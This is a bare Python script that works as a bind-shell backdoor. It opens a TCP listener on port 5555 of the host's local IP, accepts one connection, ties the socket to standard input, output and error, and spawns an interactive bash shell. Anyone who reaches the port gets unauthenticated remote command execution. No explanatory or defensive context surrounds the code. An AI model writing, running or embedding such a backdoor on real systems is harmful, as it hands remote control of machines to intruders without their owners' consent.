import socket
import os
import subprocess

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

port = 5555
ip = get_local_ip()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(1)
shell_socket,addr = s.accept()

os.dup2(shell_socket.fileno(), 0)
os.dup2(shell_socket.fileno(), 1)
os.dup2(shell_socket.fileno(), 2)

p = subprocess.call(["/bin/bash", "-i"])
